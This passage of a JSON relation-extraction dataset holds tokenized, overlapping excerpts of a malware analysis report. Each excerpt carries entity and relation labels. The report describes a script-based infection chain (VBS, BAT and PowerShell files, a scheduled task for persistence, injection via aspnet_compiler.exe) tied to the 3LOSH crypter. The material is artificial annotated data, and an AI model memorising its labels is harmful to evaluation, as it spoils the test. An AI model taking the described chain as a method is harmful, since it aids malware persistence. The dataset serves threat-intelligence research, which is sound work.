"PowerShell", "pos": [9, 10], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [91, 91], "name": "'Office.ps1", "pos": [12, 13], "index": "8_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [100, 100], "name": "PowerShell", "pos": [2, 3], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [114, 114], "name": "Office", "pos": [16, 17], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [132, 132], "name": "scheduled task", "pos": [1, 3], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [137, 137], "name": "Microsofd.vbs", "pos": [6, 7], "index": "12_0"}]], "labels": [{"r": "EX", "evidence": [1], "h": 0, "t": 1}, {"r": "WR", "evidence": [1, 2], "h": 0, "t": 2}, {"r": "FR", "evidence": [1, 2], "h": 0, "t": 4}, {"r": "FR", "evidence": [2], "t": 3, "h": 4}, {"r": "WR", "evidence": [2], "t": 2, "h": 3}, {"r": "EX", "evidence": [2], "h": 3, "t": 5}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "FR", "evidence": [3, 4], "h": 6, "t": 7}, {"r": "EX", "evidence": [4], "h": 7, "t": 8}, {"r": "CO", "evidence": [4, 5, 6], "h": 7, "t": 9}, {"r": "WR", "evidence": [6], "h": 9, "t": 10}, {"r": "FR", "evidence": [6, 7], "h": 9, "t": 11}, {"r": "EX", "evidence": [6, 7], "t": 10, "h": 11}, {"r": "EX", "evidence": [7], "h": 11, "t": 12}]}, {"title": "068-10", "sents": [["Finally", ",", "the", "Stage", "2", "PowerShell", "executes", "``", "Office.vbs", "''", "to", "begin", "the", "next", "step", "of", "the", "infection", "process", "."], ["The", "first", "script", ",", "``", "Office.vbs", ",", "''", "is", "executed", "by", "the", "Stage", "2", "PowerShell", "and", "invokes", "WScript", "to", "execute", "a", "batch", "file", "called", "``", "Office.bat", "''", "to", "continue", "the", "infection", "process", "."], ["WScript", "batch", "file", "execution", "."], ["This", "batch", "file", ",", "in", "turn", ",", "executes", "a", "PowerShell", "script", "called", "'Office.ps1", "'", "."], ["PowerShell", "script", "execution", "."], ["The", "next", "PowerShell", "script", "attempts", "to", "achieve", "persistence", "by", "creating", "a", "new", "Scheduled", "Task", "called", "``", "Office", "''", "that", "is", "executed", "immediately", "and", "then", "repeated", "every", "two", "minutes", ",", "as", "shown", "below", "."], ["This", "scheduled", "task", "then", "executes", "``", "Microsofd.vbs", "''", "as", "part", "of", "the", "creation", "process", "."], ["This", "next", "VBS", "initiates", "a", "short", "sleep", "before", "continuing", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [5, 5], "name": "PowerShell", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "Office.vbs", "pos": [8, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [25, 25], "name": "Office.vbs", "pos": [5, 6], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [34, 34], "name": "PowerShell", "pos": [14, 15], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [37, 37], "name": "WScript", "pos": [17, 18], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [45, 45], "name": "Office.bat", "pos": [25, 26], "index": "5_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [53, 53], "name": "WScript", "pos": [0, 1], "index": "6_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [67, 67], "name": "PowerShell", "pos": [9, 10], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [70, 70], "name": "'Office.ps1", "pos": [12, 13], "index": "8_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [79, 79], "name": "PowerShell", "pos": [2, 3], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [93, 93], "name": "Office", "pos": [16, 17], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [111, 111], "name": "scheduled task", "pos": [1, 3], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [116, 116], "name": "Microsofd.vbs", "pos": [6, 7], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [126, 126], "name": "next VBS", "pos": [1, 3], "index": "13_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "FR", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "FR", "evidence": [1], "t": 3, "h": 4}, {"r": "WR", "evidence": [1], "t": 2, "h": 3}, {"r": "EX", "evidence": [1], "h": 3, "t": 5}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 6}, {"r": "FR", "evidence": [2, 3], "h": 6, "t": 7}, {"r": "EX", "evidence": [3], "h": 7, "t": 8}, {"r": "CO", "evidence": [3, 4, 5], "h": 7, "t": 9}, {"r": "WR", "evidence": [5], "h": 9, "t": 10}, {"r": "FR", "evidence": [5, 6], "h": 9, "t": 11}, {"r": "EX", "evidence": [5, 6], "t": 10, "h": 11}, {"r": "EX", "evidence": [6], "h": 11, "t": 12}]}, {"title": "068-11", "sents": [["The", "first", "script", ",", "``", "Office.vbs", ",", "''", "is", "executed", "by", "the", "Stage", "2", "PowerShell", "and", "invokes", "WScript", "to", "execute", "a", "batch", "file", "called", "``", "Office.bat", "''", "to", "continue", "the", "infection", "process", "."], ["WScript", "batch", "file", "execution", "."], ["This", "batch", "file", ",", "in", "turn", ",", "executes", "a", "PowerShell", "script", "called", "'Office.ps1", "'", "."], ["PowerShell", "script", "execution", "."], ["The", "next", "PowerShell", "script", "attempts", "to", "achieve", "persistence", "by", "creating", "a", "new", "Scheduled", "Task", "called", "``", "Office", "''", "that", "is", "executed", "immediately", "and", "then", "repeated", "every", "two", "minutes", ",", "as", "shown", "below", "."], ["This", "scheduled", "task", "then", "executes", "``", "Microsofd.vbs", "''", "as", "part", "of", "the", "creation", "process", "."], ["This", "next", "VBS", "initiates", "a", "short", "sleep", "before", "continuing", "."], ["It", "is", "only", "responsible", "for", "executing", "``", "Microsofd.bat", "''", "to", "continue", "the", "infection", "process", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "Office.vbs", "pos": [5, 6], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [14, 14], "name": "PowerShell", "pos": [14, 15], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [17, 17], "name": "WScript", "pos": [17, 18], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [25, 25], "name": "Office.bat", "pos": [25, 26], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [33, 33], "name": "WScript", "pos": [0, 1], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [47, 47], "name": "PowerShell", "pos": [9, 10], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [50, 50], "name": "'Office.ps1", "pos": [12, 13], "index": "6_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [59, 59], "name": "PowerShell", "pos": [2, 3], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [73, 73], "name": "Office", "pos": [16, 17], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [91, 91], "name": "scheduled task", "pos": [1, 3], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [96, 96], "name": "Microsofd.vbs", "pos": [6, 7], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [106, 106], "name": "next VBS", "pos": [1, 3], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [115, 115], "name": "It", "pos": [0, 1], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [122, 122], "name": "Microsofd.bat", "pos": [7, 8], "index": "13_0"}]], "labels": [{"r": "FR", "evidence": [0], "t": 1, "h": 2}, {"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "EX", "evidence": [0], "h": 1, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 4}, {"r": "FR", "evidence": [1, 2], "h": 4, "t": 5}, {"r": "EX", "evidence": [2], "h": 5, "t": 6}, {"r": "CO", "evidence": [2, 3, 4], "h": 5, "t": 7}, {"r": "WR", "evidence": [4], "h": 7, "t": 8}, {"r": "FR", "evidence": [4, 5], "h": 7, "t": 9}, {"r": "EX", "evidence": [4, 5], "t": 8, "h": 9}, {"r": "EX", "evidence": [5], "h": 9, "t": 10}, {"r": "CO", "evidence": [6, 7], "h": 11, "t": 12}, {"r": "EX", "evidence": [7], "h": 12, "t": 13}]}, {"title": "068-12", "sents": [["WScript", "batch", "file", "execution", "."], ["This", "batch", "file", ",", "in", "turn", ",", "executes", "a", "PowerShell", "script", "called", "'Office.ps1", "'", "."], ["PowerShell", "script", "execution", "."], ["The", "next", "PowerShell", "script", "attempts", "to", "achieve", "persistence", "by", "creating", "a", "new", "Scheduled", "Task", "called", "``", "Office", "''", "that", "is", "executed", "immediately", "and", "then", "repeated", "every", "two", "minutes", ",", "as", "shown", "below", "."], ["This", "scheduled", "task", "then", "executes", "``", "Microsofd.vbs", "''", "as", "part", "of", "the", "creation", "process", "."], ["This", "next", "VBS", "initiates", "a", "short", "sleep", "before", "continuing", "."], ["It", "is", "only", "responsible", "for", "executing", "``", "Microsofd.bat", "''", "to", "continue", "the", "infection", "process", "."], ["This", "next", "batch", "file", "only", "contains", "a", "single", "line", ",", "which", "invokes", "PowerShell", "and", "executes", "'Microsofd.ps1'PowerShell", "execution", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [0, 0], "name": "WScript", "pos": [0, 1], "index": "0_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [14, 14], "name": "PowerShell", "pos": [9, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [17, 17], "name": "'Office.ps1", "pos": [12, 13], "index": "2_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [26, 26], "name": "PowerShell", "pos": [2, 3], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [40, 40], "name": "Office", "pos": [16, 17], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [58, 58], "name": "scheduled task", "pos": [1, 3], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [63, 63], "name": "Microsofd.vbs", "pos": [6, 7], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [73, 73], "name": "next VBS", "pos": [1, 3], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [82, 82], "name": "It", "pos": [0, 1], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [89, 89], "name": "Microsofd.bat", "pos": [7, 8], "index": "9_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [109, 109], "name": "PowerShell", "pos": [12, 13], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [112, 112], "name": "'Microsofd.ps1'PowerShell", "pos": [15, 16], "index": "11_0"}]], "labels": [{"r": "FR", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "EX", "evidence": [1], "h": 1, "t": 2}, {"r": "CO", "evidence": [1, 2, 3], "h": 1, "t": 3}, {"r": "WR", "evidence": [3], "h": 3, "t": 4}, {"r": "FR", "evidence": [3, 4], "h": 3, "t": 5}, {"r": "EX", "evidence": [3, 4], "t": 4, "h": 5}, {"r": "EX", "evidence": [4], "h": 5, "t": 6}, {"r": "CO", "evidence": [5, 6], "h": 7, "t": 8}, {"r": "EX", "evidence": [6], "h": 8, "t": 9}, {"r": "FR", "evidence": [6, 7], "h": 8, "t": 10}, {"r": "EX", "evidence": [7], "h": 10, "t": 11}]}, {"title": "068-13", "sents": [["This", "batch", "file", ",", "in", "turn", ",", "executes", "a", "PowerShell", "script", "called", "'Office.ps1", "'", "."], ["PowerShell", "script", "execution", "."], ["The", "next", "PowerShell", "script", "attempts", "to", "achieve", "persistence", "by", "creating", "a", "new", "Scheduled", "Task", "called", "``", "Office", "''", "that", "is", "executed", "immediately", "and", "then", "repeated", "every", "two", "minutes", ",", "as", "shown", "below", "."], ["This", "scheduled", "task", "then", "executes", "``", "Microsofd.vbs", "''", "as", "part", "of", "the", "creation", "process", "."], ["This", "next", "VBS", "initiates", "a", "short", "sleep", "before", "continuing", "."], ["It", "is", "only", "responsible", "for", "executing", "``", "Microsofd.bat", "''", "to", "continue", "the", "infection", "process", "."], ["This", "next", "batch", "file", "only", "contains", "a", "single", "line", ",", "which", "invokes", "PowerShell", "and", "executes", "'Microsofd.ps1'PowerShell", "execution", "."], ["This", "PowerShell", "script", "is", "the", "final", "script", "executed", "in", "this", "chain", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [9, 9], "name": "PowerShell", "pos": [9, 10], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "'Office.ps1", "pos": [12, 13], "index": "1_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [21, 21], "name": "PowerShell", "pos": [2, 3], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [35, 35], "name": "Office", "pos": [16, 17], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [53, 53], "name": "scheduled task", "pos": [1, 3], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [58, 58], "name": "Microsofd.vbs", "pos": [6, 7], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [68, 68], "name": "next VBS", "pos": [1, 3], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [77, 77], "name": "It", "pos": [0, 1], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [84, 84], "name": "Microsofd.bat", "pos": [7, 8], "index": "8_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [104, 104], "name": "PowerShell", "pos": [12, 13], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [107, 107], "name": "'Microsofd.ps1'PowerShell", "pos": [15, 16], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [112, 112], "name": "script", "pos": [2, 3], "index": "11_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 2}, {"r": "WR", "evidence": [2], "h": 2, "t": 3}, {"r": "FR", "evidence": [2, 3], "h": 2, "t": 4}, {"r": "EX", "evidence": [2, 3], "t": 3, "h": 4}, {"r": "EX", "evidence": [3], "h": 4, "t": 5}, {"r": "CO", "evidence": [4, 5], "h": 6, "t": 7}, {"r": "EX", "evidence": [5], "h": 7, "t": 8}, {"r": "FR", "evidence": [5, 6], "h": 7, "t": 9}, {"r": "EX", "evidence": [6], "h": 9, "t": 10}, {"r": "CO", "evidence": [6, 7], "h": 10, "t": 11}]}, {"title": "068-14", "sents": [["PowerShell", "script", "execution", "."], ["The", "next", "PowerShell", "script", "attempts", "to", "achieve", "persistence", "by", "creating", "a", "new", "Scheduled", "Task", "called", "``", "Office", "''", "that", "is", "executed", "immediately", "and", "then", "repeated", "every", "two", "minutes", ",", "as", "shown", "below", "."], ["This", "scheduled", "task", "then", "executes", "``", "Microsofd.vbs", "''", "as", "part", "of", "the", "creation", "process", "."], ["This", "next", "VBS", "initiates", "a", "short", "sleep", "before", "continuing", "."], ["It", "is", "only", "responsible", "for", "executing", "``", "Microsofd.bat", "''", "to", "continue", "the", "infection", "process", "."], ["This", "next", "batch", "file", "only", "contains", "a", "single", "line", ",", "which", "invokes", "PowerShell", "and", "executes", "'Microsofd.ps1'PowerShell", "execution", "."], ["This", "PowerShell", "script", "is", "the", "final", "script", "executed", "in", "this", "chain", "."], ["This", "script", "contains", "two", "large", "GZIP", "blobs", "and", "another", "function", "responsible", "for", "decompressing", "them", "."]], "vertexSet": [[{"type": "TP", "sent_id": 1, "global_pos": [6, 6], "name": "PowerShell", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [20, 20], "name": "Office", "pos": [16, 17], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [38, 38], "name": "scheduled task", "pos": [1, 3], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [43, 43], "name": "Microsofd.vbs", "pos": [6, 7], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [53, 53], "name": "next VBS", "pos": [1, 3], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [62, 62], "name": "It", "pos": [0, 1], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [69, 69], "name": "Microsofd.bat", "pos": [7, 8], "index": "6_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [89, 89], "name": "PowerShell", "pos": [12, 13], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [92, 92], "name": "'Microsofd.ps1'PowerShell", "pos": [15, 16], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [97, 97], "name": "script", "pos": [2, 3], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [108, 108], "name": "script", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [112, 112], "name": "GZIP blobs", "pos": [5, 7], "index": "11_0"}]], "labels": [{"r": "WR", "evidence": [1], "h": 0, "t": 1}, {"r": "FR", "evidence": [1, 2], "h": 0, "t": 2}, {"r": "EX", "evidence": [1, 2], "t": 1, "h": 2}, {"r": "EX", "evidence": [2], "h": 2, "t": 3}, {"r": "CO", "evidence": [3, 4], "h": 4, "t": 5}, {"r": "EX", "evidence": [4], "h": 5, "t": 6}, {"r": "FR", "evidence": [4, 5], "h": 5, "t": 7}, {"r": "EX", "evidence": [5], "h": 7, "t": 8}, {"r": "CO", "evidence": [5, 6], "h": 8, "t": 9}, {"r": "CO", "evidence": [5, 6, 7], "h": 8, "t": 11}, {"r": "CO", "evidence": [5, 6, 7], "h": 8, "t": 10}]}, {"title": "068-15", "sents": [["The", "next", "PowerShell", "script", "attempts", "to", "achieve", "persistence", "by", "creating", "a", "new", "Scheduled", "Task", "called", "``", "Office", "''", "that", "is", "executed", "immediately", "and", "then", "repeated", "every", "two", "minutes", ",", "as", "shown", "below", "."], ["This", "scheduled", "task", "then", "executes", "``", "Microsofd.vbs", "''", "as", "part", "of", "the", "creation", "process", "."], ["This", "next", "VBS", "initiates", "a", "short", "sleep", "before", "continuing", "."], ["It", "is", "only", "responsible", "for", "executing", "``", "Microsofd.bat", "''", "to", "continue", "the", "infection", "process", "."], ["This", "next", "batch", "file", "only", "contains", "a", "single", "line", ",", "which", "invokes", "PowerShell", "and", "executes", "'Microsofd.ps1'PowerShell", "execution", "."], ["This", "PowerShell", "script", "is", "the", "final", "script", "executed", "in", "this", "chain", "."], ["This", "script", "contains", "two", "large", "GZIP", "blobs", "and", "another", "function", "responsible", "for", "decompressing", "them", "."], ["This", "is", "accomplished", "by", "invoking", "aspnet_compiler.exe", ",", "injecting", "the", "final", "payload", ",", "and", "executing", "it", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [2, 2], "name": "PowerShell", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [16, 16], "name": "Office", "pos": [16, 17], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [34, 34], "name": "scheduled task", "pos": [1, 3], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [39, 39], "name": "Microsofd.vbs", "pos": [6, 7], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [49, 49], "name": "next VBS", "pos": [1, 3], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [58, 58], "name": "It", "pos": [0, 1], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [65, 65], "name": "Microsofd.bat", "pos": [7, 8], "index": "6_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [85, 85], "name": "PowerShell", "pos": [12, 13], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [88, 88], "name": "'Microsofd.ps1'PowerShell", "pos": [15, 16], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [93, 93], "name": "script", "pos": [2, 3], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [104, 104], "name": "script", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [108, 108], "name": "GZIP blobs", "pos": [5, 7], "index": "11_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [123, 123], "name": "aspnet_compiler.exe", "pos": [5, 6], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [128, 128], "name": "payload", "pos": [10, 11], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [132, 132], "name": "it", "pos": [14, 15], "index": "14_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "EX", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "EX", "evidence": [1], "h": 2, "t": 3}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 5}, {"r": "EX", "evidence": [3], "h": 5, "t": 6}, {"r": "FR", "evidence": [3, 4], "h": 5, "t": 7}, {"r": "EX", "evidence": [4], "h": 7, "t": 8}, {"r": "CO", "evidence": [4, 5], "h": 8, "t": 9}, {"r": "CO", "evidence": [4, 5, 6], "h": 8, "t": 11}, {"r": "CO", "evidence": [4, 5, 6], "h": 8, "t": 10}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 8, "t": 14}, {"r": "UK", "evidence": [6, 7], "t": 10, "h": 13}, {"r": "IJ", "evidence": [7], "t": 12, "h": 13}]}, {"title": "068-16", "sents": [["This", "scheduled", "task", "then", "executes", "``", "Microsofd.vbs", "''", "as", "part", "of", "the", "creation", "process", "."], ["This", "next", "VBS", "initiates", "a", "short", "sleep", "before", "continuing", "."], ["It", "is", "only", "responsible", "for", "executing", "``", "Microsofd.bat", "''", "to", "continue", "the", "infection", "process", "."], ["This", "next", "batch", "file", "only", "contains", "a", "single", "line", ",", "which", "invokes", "PowerShell", "and", "executes", "'Microsofd.ps1'PowerShell", "execution", "."], ["This", "PowerShell", "script", "is", "the", "final", "script", "executed", "in", "this", "chain", "."], ["This", "script", "contains", "two", "large", "GZIP", "blobs", "and", "another", "function", "responsible", "for", "decompressing", "them", "."], ["This", "is", "accomplished", "by", "invoking", "aspnet_compiler.exe", ",", "injecting", "the", "final", "payload", ",", "and", "executing", "it", "."], ["The", "infection", "chain", "is", "more", "complicated", ",", "featuring", "the", "use", "of", "multiple", "script-based", "components", "(", "BAT", ",", "VBS", ",", "PS1", ")", "that", "facilitate", "the", "infection", "process", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "scheduled task", "pos": [1, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "Microsofd.vbs", "pos": [6, 7], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [16, 16], "name": "next VBS", "pos": [1, 3], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [25, 25], "name": "It", "pos": [0, 1], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [32, 32], "name": "Microsofd.bat", "pos": [7, 8], "index": "4_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [52, 52], "name": "PowerShell", "pos": [12, 13], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [55, 55], "name": "'Microsofd.ps1'PowerShell", "pos": [15, 16], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [60, 60], "name": "script", "pos": [2, 3], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [71, 71], "name": "script", "pos": [1, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [75, 75], "name": "GZIP blobs", "pos": [5, 7], "index": "9_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [90, 90], "name": "aspnet_compiler.exe", "pos": [5, 6], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [95, 95], "name": "payload", "pos": [10, 11], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [99, 99], "name": "it", "pos": [14, 15], "index": "12_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "EX", "evidence": [2], "h": 3, "t": 4}, {"r": "FR", "evidence": [2, 3], "h": 3, "t": 5}, {"r": "EX", "evidence": [3], "h": 5, "t": 6}, {"r": "CO", "evidence": [3, 4], "h": 6, "t": 7}, {"r": "CO", "evidence": [3, 4, 5], "h": 6, "t": 9}, {"r": "CO", "evidence": [3, 4, 5], "h": 6, "t": 8}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 6, "t": 12}, {"r": "UK", "evidence": [5, 6], "t": 8, "h": 11}, {"r": "IJ", "evidence": [6], "t": 10, "h": 11}]}, {"title": "068-17", "sents": [["This", "next", "VBS", "initiates", "a", "short", "sleep", "before", "continuing", "."], ["It", "is", "only", "responsible", "for", "executing", "``", "Microsofd.bat", "''", "to", "continue", "the", "infection", "process", "."], ["This", "next", "batch", "file", "only", "contains", "a", "single", "line", ",", "which", "invokes", "PowerShell", "and", "executes", "'Microsofd.ps1'PowerShell", "execution", "."], ["This", "PowerShell", "script", "is", "the", "final", "script", "executed", "in", "this", "chain", "."], ["This", "script", "contains", "two", "large", "GZIP", "blobs", "and", "another", "function", "responsible", "for", "decompressing", "them", "."], ["This", "is", "accomplished", "by", "invoking", "aspnet_compiler.exe", ",", "injecting", "the", "final", "payload", ",", "and", "executing", "it", "."], ["The", "infection", "chain", "is", "more", "complicated", ",", "featuring", "the", "use", "of", "multiple", "script-based", "components", "(", "BAT", ",", "VBS", ",", "PS1", ")", "that", "facilitate", "the", "infection", "process", "."], ["Additionally", ",", "while", "analyzing", "our", "original", "sample", "cluster", "and", "new", "samples", "created", "using", "the", "3LOSH", "crypter", ",", "we", "identified", "several", "final", "payloads", "in", "both", "clusters", "that", "use", "the", "same", "infrastructure", "for", "post-compromise", "C2", "communications", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "next VBS", "pos": [1, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [10, 10], "name": "It", "pos": [0, 1], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [17, 17], "name": "Microsofd.bat", "pos": [7, 8], "index": "2_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [37, 37], "name": "PowerShell", "pos": [12, 13], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [40, 40], "name": "'Microsofd.ps1'PowerShell", "pos": [15, 16], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [45, 45], "name": "script", "pos": [2, 3], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [56, 56], "name": "script", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [60, 60], "name": "GZIP blobs", "pos": [5, 7], "index": "7_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [75, 75], "name": "aspnet_compiler.exe", "pos": [5, 6], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [80, 80], "name": "payload", "pos": [10, 11], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [84, 84], "name": "it", "pos": [14, 15], "index": "10_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "EX", "evidence": [1], "h": 1, "t": 2}, {"r": "FR", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "EX", "evidence": [2], "h": 3, "t": 4}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 5}, {"r": "CO", "evidence": [2, 3, 4], "h": 4, "t": 7}, {"r": "CO", "evidence": [2, 3, 4], "h": 4, "t": 6}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 4, "t": 10}, {"r": "UK", "evidence": [4, 5], "t": 6, "h": 9}, {"r": "IJ", "evidence": [5], "t": 8, "h": 9}]}, {"title": "068-18", "sents": [["It", "is", "only", "responsible", "for", "executing", "``", "Microsofd.bat", "''", "to", "continue", "the", "infection", "process", "."], ["This", "next", "batch", "file", "only", "contains", "a", "single", "line", ",", "which", "invokes", "PowerShell", "and", "executes", "'Microsofd.ps1'PowerShell", "execution", "."], ["This", "PowerShell", "script", "is", "the", "final", "script", "executed", "in", "this", "chain", "."], ["This", "script", "contains", "two", "large", "GZIP", "blobs", "and", "another", "function", "responsible", "for", "decompressing", "them", "."], ["This", "is", "accomplished", "by", "invoking", "aspnet_compiler.exe", ",", "injecting", "the", "final", "payload", ",", "and", "executing", "it", "."], ["The", "infection", "chain", "is", "more", "complicated", ",", "featuring", "the", "use", "of", "multiple", "script-based", "components", "(", "BAT", ",", "VBS", ",", "PS1", ")", "that", "facilitate", "the", "infection", "process", "."], ["Additionally", ",", "while", "analyzing", "our", "original", "sample", "cluster", "and", "new", "samples", "created", "using", "the", "3LOSH", "crypter", ",", "we", "identified", "several", "final", "payloads", "in", "both", "clusters", "that", "use", "the", "same", "infrastructure", "for", "post-compromise", "C2", "communications", "."], ["Matching", "RAT", "configs", "in", "both", "sample", "clusters", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "It", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "Microsofd.bat", "pos": [7, 8], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": 